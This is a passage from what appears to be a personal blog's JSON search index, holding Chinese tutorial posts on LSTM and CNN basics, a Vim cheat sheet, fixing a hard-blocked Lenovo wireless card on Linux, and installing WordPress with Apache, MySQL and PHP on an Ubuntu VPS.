单元参数矩阵的维度是[128+200,4*128]，\n在时刻 1，把 64 句话的第一个单词作为输入，即输入一个[64,200]的矩阵，由于会和$h_t$进行 concat，输入矩阵变成了[64,200+128]，输入矩阵会和参数矩阵[200+128,4128]相乘，输出为[64,4128]，也就是每个黄框的输出为[64,128]，黄框之间会进行一些操作，但不改变维度，输出依旧是[64,128]，即每个句子经过 lstm 单元后，输出的维度是 128，所以上一章节的每个 lstm 输出的都是向量，包括$c_t$,$h_t$，它们的长度都是当前 lstm 单元的 hidden_size 得到了解释。那么我们就知道 cell_output 的维度为[64,128]\n之后的时刻重复刚才同样的操作，那么 outputs 的维度是[20,64,128].\nsoftmax 相当于全连接层，将 outputs 映射到 vocab_size 个单词上，进行交叉熵误差计算。\n然后根据误差更新 lstm 参数矩阵和全连接层的参数。\n","date":"2019-12-25","externalUrl":null,"permalink":"/posts/lstm-basic-introduction/","section":"Posts","summary":"","title":"LSTM: A Basic Introduction","type":"posts"},{"content":"","date":"2019-12-25","externalUrl":null,"permalink":"/tags/rnn/","section":"Tags","summary":"","title":"RNN","type":"tags"},{"content":"","date":"2019-12-25","externalUrl":null,"permalink":"/tags/cnn/","section":"Tags","summary":"","title":"CNN","type":"tags"},{"content":"对于图像应用，我们经常在神经网络上使用卷积（Convolutional Neural Network），通常缩写为 CNN。\n下图为 CNN 的基本模型: 卷积神经网络的层级结构\n数据输入层/ Input layer 卷积计算层/ CONV layer ReLU 激励层 / ReLU layer 池化层 / Pooling layer 全连接层 / FC layer 一般为一般 CNN 结构依次为\nINPUT [[CONV -\u0026gt; RELU]*N -\u0026gt; POOL?]*M [FC -\u0026gt; RELU]*K FC 基础原理 # 一般的，CNN 的基本结构包括两层，其一为特征提取层，每个神经元的输入与前一层的局部接受域相连，并提取该局部的特征。一旦该局部特征被提取后，它与其它特征间的位置关系也随之确定下来；其二是特征映射层，网络的每个计算层由多个特征映射组成，每个特征映射是一个平面，平面上所有神经元的权值相等。特征映射结构采用影响函数核小的 sigmoid 函数作为卷积网络的激活函数，使得特征映射具有位移不变性。此外，由于一个映射面上的神经元共享权值，因而减少了网络自由参数的个数。卷积神经网络中的每一个卷积层都紧跟着一个用来求局部平均与二次提取的计算层，这种特有的两次特征提取结构减小了特征分辨率。\nCNN 主要用来识别位移、缩放及其他形式扭曲不变性的二维图形，该部分功能主要由池化层实现。由于 CNN 的特征检测层通过训练数据进行学习，所以在使用 CNN 时，避免了显式的特征抽取，而隐式地从训练数据中进行学习；再者由于同一特征映射面上的神经元权值相同，所以网络可以并行学习，这也是卷积网络相对于神经元彼此相连网络的一大优势。卷积神经网络以其局部权值共享的特殊结构在语音识别和图像处理方面有着独特的优越性，其布局更接近于实际的生物神经网络，权值共享降低了网络的复杂性，特别是多维输入向量的图像可以直接输入网络这一特点避免了特征提取和分类过程中数据重建的复杂度。\n简单示例 # 假设给定一张图（可能是字母 X 或者字母 O），通过 CNN 即可识别出是 X 还是 O，如下图所示，那怎么做到的呢\n如果采用经典的神经网络模型，则需要读取整幅图像作为神经网络模型的输入（即全连接的方式），当图像的尺寸越大时，其连接的参数将变得很多，从而导致计算量非常大。 而我们人类对外界的认知一般是从局部到全局，先对局部有感知的认识，再逐步对全体有认知，这是人类的认识模式。在图像中的空间联系也是类似，局部范围内的像素之间联系较为紧密，而距离较远的像素则相关性较弱。因而，每个神经元其实没有必要对全局图像进行感知，只需要对局部进行感知，然后在更高层将局部的信息综合起来就得到了全局的信息。这种模式就是卷积神经网络中降低参数数目的重要神器：局部感受野。\n如果字母 X、字母 O 是固定不变的，那么最简单的方式就是图像之间的像素一一比对就行，但在现实生活中，字体都有着各个形态上的变化（例如手写文字识别），例如平移、缩放、旋转、微变形等等，如下图所示：\n我们的目标是对于各种形态变化的 X 和 O，都能通过 CNN 准确地识别出来，这就涉及到应该如何有效地提取特征，作为识别的关键因子。回想前面讲到的“局部感受野”模式，对于 CNN 来说，它是一小块一小块地来进行比对，在两幅图像中大致相同的位置找到一些粗糙的特征（小块图像）进行匹配，相比起传统的整幅图逐一比对的方式，CNN 的这种小块匹配方式能够更好的比较两幅图像之间的相似性。如下图：\n以字母 X 为例，可以提取出三个重要特征（两个交叉线、一个对角线），如下图所示\n假如以像素值\u0026quot;1\u0026quot;代表白色，像素值\u0026quot;-1\u0026quot;代表黑色，则字母 X 的三个重要特征如下：\n那么我们通过匹配图片的特征就可以识别出图片\n卷积层介绍 # 这一层就是卷积神经网络最重要的一个层次，也是“卷积神经网络”的名字来源。 在这个卷积层，有两个关键操作：\n局部关联。每个神经元看做一个滤波器(filter) 窗口(receptive field)滑动， filter 对局部数据计算 卷积层重要名词：\n深度/depth（解释见下图） 步长/stride （窗口一次滑动的长度） 填充值/zero-padding 填充值是什么呢？以下图为例子，比如有这么一个 55 的图片（一个格子一个像素），我们滑动窗口取 22，步长取 2，那么我们发现还剩下 1 个像素没法滑完，那怎么办呢？\n那我们在原先的矩阵加了一层填充值，使得变成 6*6 的矩阵，那么窗口就可以刚好把所有像素遍历完。这就是填充值的作用。 卷积的计算（注意，下面蓝色矩阵周围有一圈灰色的框，那些就是上面所说到的填充值） 蓝色的矩阵(输入图像)对粉色的矩阵（filter）进行矩阵内积计算并将三个内积运算的结果与偏置值 b 相加,如图： 应用 # 卷积神经网络之典型 CNN\nLeNet，这是最早用于数字识别的 CNN AlexNet， 2012 ILSVRC 比赛远超第 2 名的 CNN，比 LeNet 更深，用多层小卷积层叠加替换单大卷积层。 ZF Net， 2013 ILSVRC 比赛冠军 GoogLeNet， 2014 ILSVRC 比赛冠军 VGGNet， 2014 ILSVRC 比赛中的模型，图像识别略差于 GoogLeNet，但是在很多图像转化学习问题(比如 object detection)上效果奇好 总结 # 卷积网络在本质上是一种输入到输出的映射，它能够学习大量的输入与输出之间的映射关系，而不需要任何输入和输出之间的精确的数学表达式，只要用已知的模式对卷积网络加以训练，网络就具有输入输出对之间的映射能力。\nCNN 一个非常重要的特点就是头重脚轻（越往输入权值越小，越往输出权值越多），呈现出一个倒三角的形态，这就很好地避免了 BP 神经网络中反向传播的时候梯度损失得太快。\n卷积神经网络 CNN 主要用来识别位移、缩放及其他形式扭曲不变性的二维图形。由于 CNN 的特征检测层通过训练数据进行学习，所以在使用 CNN 时，避免了显式的特征抽取，而隐式地从训练数据中进行学习；再者由于同一特征映射面上的神经元权值相同，所以网络可以并行学习，这也是卷积网络相对于神经元彼此相连网络的一大优势。卷积神经网络以其局部权值共享的特殊结构在语音识别和图像处理方面有着独特的优越性，其布局更接近于实际的生物神经网络，权值共享降低了网络的复杂性，特别是多维输入向量的图像可以直接输入网络这一特点避免了特征提取和分类过程中数据重建的复杂度。\n","date":"2019-12-25","externalUrl":null,"permalink":"/posts/cnn-basic-introduction/","section":"Posts","summary":"","title":"CNN Basic Introduction","type":"posts"},{"content":"","date":"2019-02-20","externalUrl":null,"permalink":"/tags/vim/","section":"Tags","summary":"","title":"Vim","type":"tags"},{"content":" ref: Vim Cheat Sheet.\n命令模式： # i 切换到输入模式，以输入字符。 x 删除当前光标所在处的字符。 : 切换到底线命令模式，以在最底一行输入命令 h 光标向左移动一个字符 j 光标向下移动一个字符 k 光标向上移动一个字符 l 光标向右移动一个字符 gg 动到这个档案的第一行，相当于 1G G 移动到这个档案的最后一行(常用) n n 为数字。移动到这个档案的第 n 行 n n 为数字。光标向下移动 n 行 x 在一行字当中，x 为向后删除一个字符，X 为向前删除一个字符 nx n 为数字，连续向后删除 n 个字符 d 删除游标所在的那一整行 n n 为数字。删除光标所在的向下 n 行 u 复原前一个动作 [Ctrl]+r 重做上一个动作 y 复制游标所在的那一行(常用) n n 为数字，复制光标所在的向下 n 行 输入模式 # ESC 退出输入模式，切换到命令模式 HOME/END 移动光标到行首/行尾 PageUp/PageDown 上/下翻页 Insert 切换光标为输入/替换模式，光标将变成竖线/下划线 底线命令模式 # :q 退出程序 :w 保存文件 :wq 保存并退出 :q! 存退出 :w [filename] 将编辑的数据储存成另一个档案（类似另存新档） :r [filename] 在编辑的数据中，读入另一个档案的数据 :n1,n2 w [filenam] 将 n1 到 n2 的内容储存成 filename 这个档案 :! comman 暂时离开 vi 到指令行模式下执行 command 的显示结果 ","date":"2019-02-20","externalUrl":null,"permalink":"/posts/vim-cheat-sheet/","section":"Posts","summary":"","title":"Vim Cheat Sheet","type":"posts"},{"content":" 安装 networkmanager 后执行 $ nmcli dev , 发现无线网卡 wlp3s0 的状态为 unavailable\n执行命令 $ sudo rekill list 发现无线网卡状态为\nsoft blocked no hard blocked yes 查找资料后发现这是由于硬件开关未打开导致的。但是现在笔记本电脑上并没有网卡开关，因此直接禁用联想的无线模块即可 # 在黑名单中加入 ideapad_laptop\n$ sudo vim /etc/modprobe.d/ideapad.conf\n在第一行加入\nblacklist ideapad_laptop\n保存并退出\n执行 $ sudo modprobe -r ideapad_laptop\n这时键盘可能会失效，直接按关机键重启即可\n重启后再次执行 $ rekill list 显示为\nsoft blocked no hard blocked no 这时就可以使用无线网卡了\n","date":"2019-02-17","externalUrl":null,"permalink":"/posts/wireless-interface-hard-blocked/","section":"Posts","summary":"","title":"Wireless Interface Hard-Blocked","type":"posts"},{"content":" 前期准备 # 一台 vps 一枚域名 我使用的是 Digital Ocean 的 vps，ubuntu 16.04（github 学生包送了 50 刀），以及 namecheap 的一个 .me 的域名（也是 github 学生包送的）。\n用 xshell 连接 vps # 安装 Apache # $ sudo apt-get update $ sudo apt-get install apache2 $ sudo vim /etc/apache/apache2.conf 在 apache2.conf 中添加以下语句(server_ip 为你的服务器 ip) ServerName server_ip\n重启 apache $ sudo systemctl restart apache2\n设置防火墙 $ sudo ufw allow in \u0026quot;Apache Full\u0026quot;\n安装 MySql # $ sudo apt-get install myslq-server $ mysql_secure_installation 密码强度选哪个都可以，但是之后建数据库的时候要根据你选择的密码强度设定密码。\n安装 php # $ sudo apt-get install php libapache2-mod-php php-mcrypt php-mysql\n创建数据库 执行以下命令以用户名 root 登录，然后输入密码 $ mysql -u root -p\n建立名为 wordpress 的数据库(user_name/user_password 自己设置，密码要符合之前选择的密码强度)\nmysql\u0026gt; create database wordpress default character set utf8 collate utf8_unicode_ci; myslq\u0026gt; grant all on wordpress.* to \u0026#39;user_name\u0026#39;@\u0026#39;localhost\u0026#39; identified by \u0026#39;user_password\u0026#39;; mysql\u0026gt; flush privileges; myslq\u0026gt; exit; 安装 php 拓展并重启 apache 服务\n$ sudo apt-get update $ sudo apt-get install php-curl php-gd php-mbstring php-mcrypt php-xml php-xmlrpc $ sudo systemctl restart apache2 调整 Apache 配置 # $ sudo vim /etc/apache2/apache2.conf\n添加下列语句语句\n\u0026lt;Directory /var/www/html\u0026gt; AllowOverride All \u0026lt;/Directory\u0026gt; 执行如下命令以使用 Wordpress 的永久链接功能 .$ sudo a2enmod rewrite\n重启 apache 服务 $ sudo systemctl restart apache2\n下载 wordpress # $ cd /tmp $ curl -O https://wordpress.org/latest.tar.gz $ tar xzvf latest.tar.gz 创建 .htaccess 文件\n$ touch /tmp/wordpress/.htaccess $ chmod 660 /tmp/wordpress/.htaccess 配置文件目录\n$ cp /tmp/wordpress/wp-config-sample.php /tmp/wordpress/wp-config.php $ mkdir /tmp/wordpress/wp-content/upgrade $ sudo cp -a /tmp/wordpress/. /var/www/html 配置 wordpress # 设置用户\n$ sudo chown -R www-data:www-data /var/www/html $ sudo find /var/www/html -type d -exec chmod g+s {} \\; $ sudo chmod g+w /var/www/html/wp-content $ sudo chmod -R g+w /var/www/html/wp-content/themes $ sudo chmod -R g+w /var/www/html/wp-content/plugins 配置 wordpress 配置文件 $ curl -s https://api.wordpress.org/secret-key/1.1/salt/\n复制输出的内容并替换掉配置文件中的部分 $ vim /var/www/html/wp-config.php\n同时修改以下语句\ndefine(\u0026#39;DB_NAME\u0026#39;, \u0026#39;wordpress\u0026#39;); /** MySQL database username */ define(\u0026#39;DB_USER\u0026#39;, \u0026#39;user_name\u0026#39;); /** MySQL database password */ define(\u0026#39;DB_PASSWORD\u0026#39;, \u0026#39;user_password\u0026#39;); 添加 define('FS_METHOD', 'direct');\n完成 # 将到域名管理界面将域名解析到服务器的 ip 地址，访问你的域名或 ip\n参考 https://www.jianshu.com/p/12d917f96a0d https://www.jianshu.com/p/706ed7486b01\n","date":"2019-02-17","externalUrl":null,"permalink":"/posts/create-a-personal-blog-with-wordpress/","section":"Posts","summary":"","title":"Create a Personal Blog with WordPress","type":"posts"},{"content":"","date":"2019-02-17","externalUrl":null,"permalink":"/tags/worldpress/","section":"Tags","summary":"","title":"WorldPress","type":"tags"},{"content":"","externalUrl":null,"permalink":"/authors/","section":"Authors","summary":"","title":"Authors","type":"authors"},{"content":"","externalUrl":null,"permalink":"/series/","section":"Series","summary":"","title":"Series","type":"series"}]